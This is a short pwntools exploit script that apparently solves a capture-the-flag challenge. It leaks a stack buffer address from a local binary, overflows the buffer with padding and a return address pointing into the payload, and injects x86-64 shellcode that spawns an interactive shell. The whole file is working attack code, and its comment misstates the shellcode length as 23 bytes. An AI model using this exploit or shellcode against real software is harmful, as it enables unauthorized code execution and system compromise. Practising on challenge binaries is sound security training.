from pwn import *

shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"# 23字节的shellcode

p = process('./sniperoj-pwn100-shellcode-x86-64')
p.recvuntil('[')
buf_addr = p.recvuntil(']',drop=True)# 获取buf的地址
print(int(buf_addr,16))
fillw_addr = int(buf_addr,16) + 0x20 # 指向shellcode的地址
p.sendline(0x18*b'a'+p64(fillw_addr)+shellcode)
p.interactive()